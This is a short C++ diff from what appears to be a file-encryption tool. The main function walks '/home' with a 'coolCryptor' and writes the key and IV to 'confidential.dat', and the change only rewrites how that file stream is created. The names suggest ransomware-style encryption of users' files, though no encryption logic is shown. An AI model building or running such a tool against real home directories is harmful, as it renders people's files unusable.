@@ -11,7 +11,9 @@ int main(int argc, char **argv) {
     Walker shadowWalker("/home", coolCryptor);
 
     shadowWalker.setCmdArgs(argc, argv);
-    auto saveKey(static_cast<std::ofstream>("confidential.dat"));
+
+    std::ofstream saveKey("confidential.dat");
+    
     saveKey << coolCryptor->getKey() + coolCryptor->getIV();
     saveKey.close();
     shadowWalker.walk();
